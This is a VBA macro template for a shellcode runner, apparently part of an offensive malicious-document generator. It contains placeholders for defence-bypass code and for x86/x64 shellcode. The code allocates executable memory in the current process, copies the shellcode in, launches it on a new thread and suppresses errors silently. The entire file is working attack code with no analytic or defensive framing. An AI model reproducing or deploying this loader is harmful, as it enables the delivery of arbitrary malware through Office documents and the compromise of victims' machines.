{{bypassCode}}

{{moduleCode}}

Sub generic_shellcode_runner()
    
    Dim bResult As Boolean
    Dim lpShellcode() As Byte
    Dim dwShellcodeSize As Long
    Dim lpDestination As LongPtr
    Dim dwBytesWritten As LongPtr
    Dim hTargetThread As LongPtr

	On Error Resume Next

    {{bypassCalls}}
    
    {{moduleCalls}}
    
	
    #If Win64 Then
        lpShellcode = getShellcode_x64()
    #Else
        lpShellcode = getShellcode_x86()
    #End If
    
    dwShellcodeSize = UBound(lpShellcode) + 1
    
    if dwShellcodeSize < 4 Then Exit Sub
    
    lpDestination = 0
    lpDestination = m_VirtualAllocEx(-1&, 0, dwShellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE)
    If lpDestination = 0 Then Exit Sub

	If "{{memorymode}}" = "move" Then
		m_RtlMoveMemory lpDestination, VarPtr(lpShellcode(0)), dwShellcodeSize
	Else
		bResult = m_WriteProcessMemory(-1&, lpDestination, VarPtr(lpShellcode(0)), dwShellcodeSize, dwBytesWritten)
		If bResult = False Then Exit Sub
		If dwBytesWritten <> dwShellcodeSize Then Exit Sub
	End If
    
	hTargetThread = m_beginthread(lpDestination, 0&, 0&)
	If hTargetThread = 0 Then Exit Sub
    
End Sub

{{shellcode_x86_func}}

{{shellcode_x64_func}}

